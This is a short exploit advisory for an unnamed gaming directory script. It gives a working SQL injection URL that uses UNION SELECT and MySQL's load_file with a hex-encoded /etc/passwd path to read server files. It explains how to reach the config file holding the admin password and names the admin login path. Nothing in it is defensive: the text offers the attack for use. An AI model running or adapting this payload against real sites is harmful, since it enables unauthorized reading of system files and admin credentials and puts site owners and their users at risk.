DESCRIPTION:
this popular gaming directory script is vulnerable due to insecure mysql querys.
this allows the remote attacker to pull info from the database.

The below Injection uses MYSQL's load_file function, since the admin area password is stored
in a config file we can use load_file to to try and locate it and display the contents of the file.
certain permissons to the running db user is required for this to work. in the load_file below
is a string that has been converted to HEX and if you can read hex then its /etc/passwd so this
should load the /etc/passwd file on most linux distros. Remember certain permissions are needed.


EXPLOITS:
http://site.com/directory.php?ax=list&sub=6&cat_id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,load_file(0x2F6574632F706173737764),4/**/FROM/**/links/*


NOTE/TIP:
admin login is at /siteadmin/
